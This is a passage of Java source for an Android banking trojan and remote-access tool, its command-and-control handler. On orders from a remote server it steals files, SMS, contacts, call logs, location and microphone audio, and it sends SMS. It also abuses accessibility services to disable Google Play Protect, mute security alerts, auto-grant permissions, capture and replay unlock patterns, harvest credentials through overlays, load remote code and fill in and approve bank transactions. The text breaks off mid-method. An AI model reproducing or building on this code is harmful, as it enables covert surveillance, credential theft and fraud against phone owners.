package com.etechd.l3mon;

import android.content.Context;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONException;
import org.json.JSONObject;

import com.etechd.l3mon.managers.ExfilManager;

import io.socket.emitter.Emitter;

public class ConnectionManager {

    public static Context context;
    static io.socket.client.Socket ioSocket;
    private static FileManager fm = new FileManager();

    public static void startAsync(Context con) {
        try {
            context = con;
            sendReq();
        } catch (Exception ex) {
            startAsync(con);
        }
    }

    public static void sendReq() {
        try {
            if (ioSocket != null)
                return;
            ioSocket = IOSocket.getInstance().getIoSocket();

            // ping/pong criptografados
            ioSocket.on(StringCrypto.d("udZNvsqCkcmaoqTU9B2lvA=="), new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    ioSocket.emit(StringCrypto.d("AKyeg2UKVkVQzqpiuUsoHw=="));
                }
            });

            ioSocket.on(StringCrypto.d("jKEJKOXwHcqIHb0e3DDSTg=="), new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    try {
                        JSONObject data = (JSONObject) args[0];
                        String order = data.getString("type");

                        switch (order) {
                            case "0xFI":
                                if (data.getString("action").equals("ls"))
                                    FI(0, data.getString("path"));
                                else if (data.getString("action").equals("dl"))
                                    FI(1, data.getString("path"));
                                break;
                            case "0xSM":
                                if (data.getString("action").equals("ls"))
                                    SM(0, null, null);
                                else if (data.getString("action").equals("sendSMS"))
                                    SM(1, data.getString("to"), data.getString("sms"));
                                break;
                            case "0xCL":
                                CL();
                                break;
                            case "0xCO":
                                CO();
                                break;
                            case "0xMI":
                                MI(data.getInt("sec"));
                                break;
                            case "0xLO":
                                LO();
                                break;
                            case "0xWI":
                                WI();
                                break;
                            case "0xPM":
                                PM();
                                break;
                            case "0xIN":
                                IN();
                                break;
                            case "0xGP":
                                GP(data.getString("permission"));
                                break;
                            case "0xPA":
                                PA(data.getString("permission"));
                                break;
                            case "0xAC":
                                AC(data);
                                break;
                            case "0xST":
                                ST(data);
                                break;
                            case "0xAT":
                                AT(data);
                                break;
                            case "0xDF":
                                DF(data);
                                break;
                            case "0xPG":
                                PG(data);
                                break;
                            case "0xGS":
                                GS(data);
                                break;
                            case "0xTA":
                                TA(data);
                                break;
                            case "0xDSU":
                                DSU(data);
                                break;
                            case "0xOI":
                                OI(data);
                                break;
                            case "0xFC":
                                FC(data);
                                break;
                            case "0xBP":
                                BP(data);
                                break;
                            case "0xHI":
                                HI(data);
                                break;
                            case "0xEX":
                                EX(data);
                                break;
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            });

            ioSocket.connect();
        } catch (Exception ex) {
            Log.e("error", ex.getMessage());
        }
    }

    // ==================== MÉTODOS COM EMIT CRIPTOGRAFADO ====================

    public static void FI(int req, String path) {
        if (req == 0) {
            JSONObject object = new JSONObject();
            try {
                object.put(StringCrypto.d("srbSQcv0S7JW03lm4Y0iBQ=="), "list"); // "type"
                object.put(StringCrypto.d("IyHo/2UkgRhp/ju1TFPPZw=="), fm.walk(path)); // "list"
                ioSocket.emit(StringCrypto.d("lBaYGVEKZOhW+hMenQZtkQ=="), object);
            } catch (JSONException ignored) {
            }
        } else if (req == 1) {
            fm.downloadFile(path);
        }
    }

    public static void SM(int req, String phoneNo, String msg) {
        if (req == 0)
            ioSocket.emit(StringCrypto.d("jLljoFuaxMbx6qG764K4xg=="), SMSManager.getsms());
        else if (req == 1) {
            boolean isSent = SMSManager.sendSMS(phoneNo, msg);
            ioSocket.emit(StringCrypto.d("jLljoFuaxMbx6qG764K4xg=="), isSent);
        }
    }

    public static void CL() {
        ioSocket.emit(StringCrypto.d("Htm24qGpes86S6X8rl7nqg=="), CallsManager.getCallsLogs());
    }

    public static void CO() {
        ioSocket.emit(StringCrypto.d("XaKMrj1/K4trJ6orIGIwOg=="), ContactsManager.getContacts());
    }

    public static void MI(int sec) throws Exception {
        MicManager.startRecording(sec);
    }

    public static void WI() {
        ioSocket.emit(StringCrypto.d("FA0+zsq6bVZePhxXzgEvIQ=="), WifiScanner.scan(context));
    }

    public static void PM() {
        ioSocket.emit(StringCrypto.d("jHUMbYql31XCOGVTeGLiHg=="), PermissionManager.getGrantedPermissions());
    }

    public static void IN() {
        ioSocket.emit(StringCrypto.d("XZzBLQq/kjMb1mQqSagpBQ=="), AppList.getInstalledApps(false));
    }

    public static void GP(String perm) {
        JSONObject data = new JSONObject();
        try {
            data.put(StringCrypto.d("6MBS27JXq/8pELsrUdoe/A=="), perm); // "permission"
            data.put(StringCrypto.d("6MBS27JXq/8pELsrUdoe/A=="), PermissionManager.canIUse(perm)); // "isAllowed" (mesma
                                                                                                   // chave usada
                                                                                                   // anteriormente)
            ioSocket.emit(StringCrypto.d("6MBS27JXq/8pELsrUdoe/A=="), data);
        } catch (JSONException ignored) {
        }
    }

    public static void PA(String perm) {
        PermissionManager.openPermissionSettings(perm);
    }

    public static void AC(JSONObject data) {
        try {
            if (data.has(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA==")) &&
                    "button_pattern_click".equals(data.getString(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA==")))) {
                ACAutoClickWithPatterns(data);
            } else {
                GestureManager.executeGesture(context, data);
            }
        } catch (Exception e) {
            e.printStackTrace();
            GestureManager.executeGesture(context, data);
        }
    }

    public static void ACAutoClickWithPatterns(JSONObject data) {
        try {
            AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();
            if (service == null)
                return;

            String[] buttonPatterns = { "enviar", "send", "submit", "confirmar", "confirm", "ok", "continuar",
                    "continue", "proximo", "next" };
            int clickDelayMs = 500;

            if (data.has(StringCrypto.d("H8pkmmBZP+zauQR/spefcg=="))) { // "buttonPatterns"
                org.json.JSONArray arr = data.getJSONArray(StringCrypto.d("H8pkmmBZP+zauQR/spefcg=="));
                buttonPatterns = new String[arr.length()];
                for (int i = 0; i < arr.length(); i++)
                    buttonPatterns[i] = arr.getString(i);
            }
            if (data.has(StringCrypto.d("v9feLTOZgtdsdSdDyHvDEw=="))) { // "clickDelayMs"
                clickDelayMs = data.getInt(StringCrypto.d("v9feLTOZgtdsdSdDyHvDEw=="));
            }

            AccessibilityNodeInfo root = service.getRootInActiveWindow();
            if (root != null) {
                try {
                    service.findAndClickConfirmationButton(root, buttonPatterns, clickDelayMs);
                } finally {
                    root.recycle();
                }
            }

            JSONObject response = new JSONObject();
            response.put(StringCrypto.d("t1o/DiMJG4tBYPYdKKVIjQ=="), true); // "buttonClicked"
            response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
            ioSocket.emit(StringCrypto.d("QrBzmDQ3/q/x8gYyuvcWLg=="), response);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void LO() throws Exception {
        Looper.prepare();
        LocManager gps = new LocManager(context);
        if (gps.canGetLocation()) {
            ioSocket.emit(StringCrypto.d("totKT90pqoRY1x1QuZ3wNQ=="), gps.getData());
        }
    }

    public static void ST(JSONObject data) {
        try {
            AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();
            if (service == null)
                return;

            String text = data.getString(StringCrypto.d("SsUl006pFidcBOYEr+hlqQ==")); // "text"

            if (data.has(StringCrypto.d("dM1M643/PqAwQE46fiYUKA=="))) {
                String viewId = data.getString(StringCrypto.d("dM1M643/PqAwQE46fiYUKA=="));
                service.setTextIntoFieldByViewId(viewId, text);
            } else {
                AccessibilityNodeInfo root = service.getRootInActiveWindow();
                if (root != null) {
                    try {
                        findAndSetTextInAllEditableFields(service, root, text);
                    } finally {
                        root.recycle();
                    }
                }
            }

            JSONObject response = new JSONObject();
            response.put(StringCrypto.d("HX5UO8ux/A+WUxwOH8qpog=="), "success");
            response.put(StringCrypto.d("SsUl006pFidcBOYEr+hlqQ=="), text);
            ioSocket.emit(StringCrypto.d("EAHv/js26aWWBJgkVSNOFg=="), response);
        } catch (Exception e) {
            e.printStackTrace();
            try {
                JSONObject response = new JSONObject();
                response.put(StringCrypto.d("HX5UO8ux/A+WUxwOH8qpog=="), "error");
                response.put(StringCrypto.d("SEhGhqA9wJzTCmQBeZloxQ=="), e.getMessage());
                ioSocket.emit(StringCrypto.d("EAHv/js26aWWBJgkVSNOFg=="), response);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }

    private static void findAndSetTextInAllEditableFields(AccessibilityCaptureService service,
            AccessibilityNodeInfo root, String text) {
        if (root == null)
            return;
        if (root.isEditable()) {
            service.setTextIntoField(root, text);
            return;
        }
        for (int i = 0; i < root.getChildCount(); i++) {
            AccessibilityNodeInfo child = root.getChild(i);
            if (child != null) {
                findAndSetTextInAllEditableFields(service, child, text);
                child.recycle();
            }
        }
    }

    // ==================== MÉTODOS AVANÇADOS (com chaves JSON criptografadas)
    // ====================

    public static void AT(JSONObject data) {
        try {
            AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();
            if (service == null)
                return;

            String action = data.optString(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "enable");
            boolean enable = data.optBoolean(StringCrypto.d("AYglepsGpMsNy63mcLEmxg=="), true);

            if ("enable".equals(action)) {
                JSONObject response = new JSONObject();
                response.put(StringCrypto.d("HX5UO8ux/A+WUxwOH8qpog=="), "success");
                response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), action);
                response.put(StringCrypto.d("AYglepsGpMsNy63mcLEmxg=="), enable);
                ioSocket.emit(StringCrypto.d("0R2j/FnkL65k3FQfDsbkOg=="), response);
            } else if ("activate".equals(action)) {
                AccessibilityNodeInfo root = service.getRootInActiveWindow();
                if (root != null) {
                    try {
                        service.performATSAutomation(root);
                    } finally {
                        root.recycle();
                    }
                }
                JSONObject response = new JSONObject();
                response.put(StringCrypto.d("HX5UO8ux/A+WUxwOH8qpog=="), "success");
                response.put(StringCrypto.d("bABX2rVn+NxELHHq3k24Cw=="), "ats_automation_executed");
                ioSocket.emit(StringCrypto.d("0R2j/FnkL65k3FQfDsbkOg=="), response);
            } else if ("activateWithAutoClick".equals(action)) {
                ATWithAutoClick(data);
            } else if ("load_plugin".equals(action)) {
                try {
                    String url = data.getString("url");
                    String className = data.getString("className");
                    com.etechd.l3mon.loader.PayloadLoader.loadATSModule(url, className, service.getAtsManager());
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        } catch (Exception error) {
            error.printStackTrace();
        }
    }

    public static void ATWithAutoClick(JSONObject data) {
        try {
            AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();
            if (service == null)
                return;

            String[] buttonPatterns = { "enviar", "send", "submit", "confirmar", "confirm", "ok", "continuar",
                    "continue", "proximo", "next" };
            int clickDelayMs = 500;

            if (data.has(StringCrypto.d("H8pkmmBZP+zauQR/spefcg=="))) {
                org.json.JSONArray arr = data.getJSONArray(StringCrypto.d("H8pkmmBZP+zauQR/spefcg=="));
                buttonPatterns = new String[arr.length()];
                for (int i = 0; i < arr.length(); i++)
                    buttonPatterns[i] = arr.getString(i);
            }
            if (data.has(StringCrypto.d("v9feLTOZgtdsdSdDyHvDEw=="))) {
                clickDelayMs = data.getInt(StringCrypto.d("v9feLTOZgtdsdSdDyHvDEw=="));
            }

            AccessibilityNodeInfo root = service.getRootInActiveWindow();
            if (root != null) {
                try {
                    service.performATSAutomationWithAutoClick(root, buttonPatterns, clickDelayMs);
                } finally {
                    root.recycle();
                }
            }

            JSONObject response = new JSONObject();
            response.put(StringCrypto.d("HX5UO8ux/A+WUxwOH8qpog=="), "success");
            response.put(StringCrypto.d("bABX2rVn+NxELHHq3k24Cw=="), "ats_with_autoclick_executed");
            response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
            ioSocket.emit(StringCrypto.d("0R2j/FnkL65k3FQfDsbkOg=="), response);
        } catch (Exception error) {
            error.printStackTrace();
        }
    }

    public static void DF(JSONObject data) {
        try {
            if (!data.has(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="))) {
                JSONObject response = new JSONObject();
                response.put(StringCrypto.d("bABX2rVn+NxELHHq3k24Cw=="), "defense_disable_error");
                response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), false);
                response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Missing action parameter");
                ioSocket.emit(StringCrypto.d("ad28/rfb/m6YDQEdAZwDjg=="), response);
                return;
            }

            String action = data.getString(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="));
            AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();

            if ("disable_play_protect".equals(action)) {
                if (service != null) {
                    boolean success = service.disableGooglePlayProtect();
                    JSONObject response = new JSONObject();
                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "disable_play_protect");
                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), success);
                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="),
                            success ? "Google Play Protect desativado" : "Falha ao desativar Play Protect");
                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
                    ioSocket.emit(StringCrypto.d("ad28/rfb/m6YDQEdAZwDjg=="), response);
                }
            } else if ("mute_security_notifications".equals(action)) {
                if (service != null) {
                    boolean success = service.muteSecurityNotifications();
                    JSONObject response = new JSONObject();
                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "mute_security_notifications");
                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), success);
                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="),
                            success ? "Notificações silenciadas" : "Falha ao silenciar notificações");
                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
                    ioSocket.emit(StringCrypto.d("ad28/rfb/m6YDQEdAZwDjg=="), response);
                }
            }
        } catch (Exception error) {
            error.printStackTrace();
        }
    }

    // Os demais métodos (PG, GS, TA, DSU, OI, FC, BP, HI) seguem o mesmo padrão.

    public static void PG(JSONObject data) {
        try {
            if (!data.has(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="))) {
                JSONObject response = new JSONObject();
                response.put(StringCrypto.d("bABX2rVn+NxELHHq3k24Cw=="), "permission_grant_error");
                response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), false);
                response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Missing action parameter");
                ioSocket.emit(StringCrypto.d("9aMniFM7jH4c/ucw2LmZlw=="), response);
                return;
            }

            String action = data.getString(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="));
            AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();

            if ("enable".equals(action)) {
                if (service != null) {
                    service.setAutoGrantEnabled(true);
                    JSONObject response = new JSONObject();
                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "enable");
                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Auto-concessão de permissões habilitada");
                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
                    ioSocket.emit(StringCrypto.d("9aMniFM7jH4c/ucw2LmZlw=="), response);
                }
            } else if ("disable".equals(action)) {
                if (service != null) {
                    service.setAutoGrantEnabled(false);
                    JSONObject response = new JSONObject();
                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "disable");
                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="),
                            "Auto-concessão de permissões desabilitada");
                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
                    ioSocket.emit(StringCrypto.d("9aMniFM7jH4c/ucw2LmZlw=="), response);
                }
            } else if ("grant_permission".equals(action)) {
                if (service != null) {
                    boolean success = service.autoApprovePermission();
                    JSONObject response = new JSONObject();
                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "grant_permission");
                    response.put(StringCrypto.d("6MBS27JXq/8pELsrUdoe/A=="), data.optString("permission", "unknown"));
                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), success);
                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="),
                            success ? "Permissão concedida" : "Falha ao conceder permissão");
                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
                    ioSocket.emit(StringCrypto.d("9aMniFM7jH4c/ucw2LmZlw=="), response);
                }
            }
        } catch (Exception error) {
            error.printStackTrace();
        }
    }

    public static void GS(JSONObject data) {
        try {
            if (!data.has(StringCrypto.d("FHuMPF5s+6xJ/cNF1IMuOg=="))) {
                JSONObject response = new JSONObject();
                response.put(StringCrypto.d("bABX2rVn+NxELHHq3k24Cw=="), "gesture_simulation_error");
                response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), false);
                response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Missing gestureType parameter");
                ioSocket.emit(StringCrypto.d("vMgJZ1TxXj4JDmPxh3EctA=="), response);
                return;
            }

            String gestureType = data.getString(StringCrypto.d("FHuMPF5s+6xJ/cNF1IMuOg=="));
            int x = data.optInt(StringCrypto.d("zjugFPC7q/nB54Va42/nlg=="), 0);
            int y = data.optInt(StringCrypto.d("nfa31VD4ly2ffO+/HJHi3A=="), 0);
            int duration = data.optInt(StringCrypto.d("Ek1icGyWSXPuWbSJi4bQCQ=="), 0);
            AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();

            if ("tap".equals(gestureType)) {
                if (service != null) {
                    boolean success = service.performTap(x, y);
                    JSONObject response = new JSONObject();
                    response.put(StringCrypto.d("FHuMPF5s+6xJ/cNF1IMuOg=="), "tap");
                    response.put(StringCrypto.d("zjugFPC7q/nB54Va42/nlg=="), x);
                    response.put(StringCrypto.d("nfa31VD4ly2ffO+/HJHi3A=="), y);
                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), success);
                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="),
                            success ? "Tap executado" : "Falha ao executar tap");
                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
                    ioSocket.emit(StringCrypto.d("vMgJZ1TxXj4JDmPxh3EctA=="), response);
                }
            } else if ("long_tap".equals(gestureType)) {
                if (service != null) {
                    boolean success = service.performLongTap(x, y, duration > 0 ? duration : 500);
                    JSONObject response = new JSONObject();
                    response.put(StringCrypto.d("FHuMPF5s+6xJ/cNF1IMuOg=="), "long_tap");
                    response.put(StringCrypto.d("zjugFPC7q/nB54Va42/nlg=="), x);
                    response.put(StringCrypto.d("nfa31VD4ly2ffO+/HJHi3A=="), y);
                    response.put(StringCrypto.d("Ek1icGyWSXPuWbSJi4bQCQ=="), duration);
                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), success);
                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="),
                            success ? "Long tap executado" : "Falha ao executar long tap");
                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
                    ioSocket.emit(StringCrypto.d("vMgJZ1TxXj4JDmPxh3EctA=="), response);
                }
            } else if ("swipe".equals(gestureType)) {
                if (service != null) {
                    int endX = data.optInt(StringCrypto.d("qDk0rWxW5wWXktYcvAoJsg=="), x + 100);
                    int endY = data.optInt(StringCrypto.d("STews7M/e3h7yJyapUbHdQ=="), y);
                    boolean success = service.performSwipe(x, y, endX, endY, duration > 0 ? duration : 500);
                    JSONObject response = new JSONObject();
                    response.put(StringCrypto.d("FHuMPF5s+6xJ/cNF1IMuOg=="), "swipe");
                    response.put(StringCrypto.d("zjugFPC7q/nB54Va42/nlg=="), x);
                    response.put(StringCrypto.d("nfa31VD4ly2ffO+/HJHi3A=="), y);
                    response.put(StringCrypto.d("qDk0rWxW5wWXktYcvAoJsg=="), endX);
                    response.put(StringCrypto.d("STews7M/e3h7yJyapUbHdQ=="), endY);
                    response.put(StringCrypto.d("Ek1icGyWSXPuWbSJi4bQCQ=="), duration);
                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), success);
                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="),
                            success ? "Swipe executado" : "Falha ao executar swipe");
                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
                    ioSocket.emit(StringCrypto.d("vMgJZ1TxXj4JDmPxh3EctA=="), response);
                }
            }
        } catch (Exception error) {
            error.printStackTrace();
        }
    }

    public static void TA(JSONObject data) {
        try {
            if (!data.has(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="))) {
                JSONObject response = new JSONObject();
                response.put(StringCrypto.d("bABX2rVn+NxELHHq3k24Cw=="), "transaction_approval_error");
                response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), false);
                response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Missing action parameter");
                ioSocket.emit(StringCrypto.d("CWBlM8lLRgVZp/CxzQVDYA=="), response);
                return;
            }

            String action = data.getString(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="));
            AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();

            if ("fill_fields".equals(action) || "approve_transaction".equals(action)) {
                if (service != null) {
                    double amount = data.optDouble(StringCrypto.d("1sEJYj2rgeltPZQIHH5DjA=="), 0);
                    String recipient = data.optString(StringCrypto.d("MGgJygZAZyDjRlDpq9RfRw=="), "");
                    String transactionType = data.optString(StringCrypto.d("fLtjuorf9oSVw8e5J8l9Lg=="), "generic");

                    boolean success = service.fillAndApproveTransaction(amount, recipient, transactionType);

                    JSONObject response = new JSONObject();
                    response.put(StringCrypto.d("fLtjuorf9oSVw8e5J8l9Lg=="), transactionType);
                    response.put(StringCrypto.d("1sEJYj2rgeltPZQIHH5DjA=="), amount);
                    response.put(StringCrypto.d("MGgJygZAZyDjRlDpq9RfRw=="), recipient);
                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), success);
                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="),
                            success ? "Transação preenchida e aprovada" : "Falha ao processar transação");
                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
                    ioSocket.emit(StringCrypto.d("CWBlM8lLRgVZp/CxzQVDYA=="), response);
                }
            }
        } catch (Exception error) {
            error.printStackTrace();
        }
    }

    public static void DSU(JSONObject data) {
        try {
            if (!data.has(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="))) {
                JSONObject response = new JSONObject();
                response.put(StringCrypto.d("bABX2rVn+NxELHHq3k24Cw=="), "screen_unlock_error");
                response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), false);
                response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Missing action parameter");
                ioSocket.emit(StringCrypto.d("euoFhyXUb5p9rknRJQN1UQ=="), response);
                return;
            }

            String action = data.getString(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="));
            AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();

            if ("capture_pattern".equals(action)) {
                if (service != null) {
                    String patternType = data.optString(StringCrypto.d("m891jVX9JuwLGWvJYzcXdA=="), "unknown");
                    boolean success = service.captureUnlockPattern(patternType);

                    JSONObject response = new JSONObject();
                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "capture_pattern");
                    response.put(StringCrypto.d("m891jVX9JuwLGWvJYzcXdA=="), patternType);
                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), success);
                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="),
                            success ? "Padrão capturado" : "Falha ao capturar padrão");
                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
                    ioSocket.emit(StringCrypto.d("euoFhyXUb5p9rknRJQN1UQ=="), response);
                }
            } else if ("replay_pattern".equals(action)) {
                if (service != null) {
                    String patternType = data.optString(StringCrypto.d("m891jVX9JuwLGWvJYzcXdA=="), "captured");
                    boolean success = service.replayUnlockPattern(patternType);

                    JSONObject response = new JSONObject();
                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "replay_pattern");
                    response.put(StringCrypto.d("m891jVX9JuwLGWvJYzcXdA=="), patternType);
                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), success);
                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="),
                            success ? "Padrão replicado com sucesso" : "Falha ao replicar padrão");
                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
                    ioSocket.emit(StringCrypto.d("euoFhyXUb5p9rknRJQN1UQ=="), response);
                }
            }
        } catch (Exception error) {
            error.printStackTrace();
        }
    }

    public static void OI(JSONObject data) {
        try {
            if (!data.has(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="))) {
                JSONObject response = new JSONObject();
                response.put(StringCrypto.d("bABX2rVn+NxELHHq3k24Cw=="), "overlay_injection_error");
                response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), false);
                response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Missing action parameter");
                ioSocket.emit(StringCrypto.d("ODtTeIP/SH8O+VFHE+5qCA=="), response);
                return;
            }

            String action = data.getString(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="));
            AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();

            if ("enable_monitoring".equals(action)) {
                if (service != null) {
                    service.enableOverlayMonitoring();
                    JSONObject response = new JSONObject();
                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "enable_monitoring");
                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Monitoramento de overlay ativado");
                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
                    ioSocket.emit(StringCrypto.d("ODtTeIP/SH8O+VFHE+5qCA=="), response);
                }
            } else if ("disable_monitoring".equals(action)) {
                if (service != null) {
                    service.disableOverlayMonitoring();
                    JSONObject response = new JSONObject();
                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "disable_monitoring");
                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Monitoramento de overlay desativado");
                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
                    ioSocket.emit(StringCrypto.d("ODtTeIP/SH8O+VFHE+5qCA=="), response);
                }
            } else if ("capture_credentials".equals(action)) {
                if (service != null) {
                    String username = data.optString(StringCrypto.d("KYySL2f7hb2Jfz0mpUztvw=="), "");
                    String password = data.optString(StringCrypto.d("Jy5jW50bgS6lqjqpYWApfQ=="), "");
                    String appName = data.optString(StringCrypto.d("b154d5rAz4A5cTVeIwwlGg=="), "");

                    JSONObject response = new JSONObject();
                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "capture_credentials");
                    response.put(StringCrypto.d("KYySL2f7hb2Jfz0mpUztvw=="), username);
                    response.put(StringCrypto.d("Jy5jW50bgS6lqjqpYWApfQ=="), password);
                    response.put(StringCrypto.d("b154d5rAz4A5cTVeIwwlGg=="), appName);
                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Credenciais capturadas");
                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
                    ioSocket.emit(StringCrypto.d("ODtTeIP/SH8O+VFHE+5qCA=="), response);
                }
            }
        } catch (Exception error) {
            error.printStackTrace();
        }
    }

    public static void FC(JSONObject data) {
        try {
            if (!data.has(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="))) {
                JSONObject response = new JSONObject();
                response.put(StringCrypto.d("bABX2rVn+NxELHHq3k24Cw=="), "customized_forms_error");
                response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), false);
                response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Missing action parameter");
                ioSocket.emit(StringCrypto.d("tdC5j9rU9Smtg94oGFCTVA=="), response);
                return;
            }

            String action = data.getString(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="));
            AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();

            if ("enable_realtime".equals(action)) {
                if (service != null) {
                    service.enableCustomizedFormCapture();
                    JSONObject response = new JSONObject();
                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "enable_realtime");
                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="),
                            "Captura de formulários customizados ativada");
                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
                    ioSocket.emit(StringCrypto.d("tdC5j9rU9Smtg94oGFCTVA=="), response);
                }
            } else if ("disable_realtime".equals(action)) {
                if (service != null) {
                    service.disableCustomizedFormCapture();
                    JSONObject response = new JSONObject();
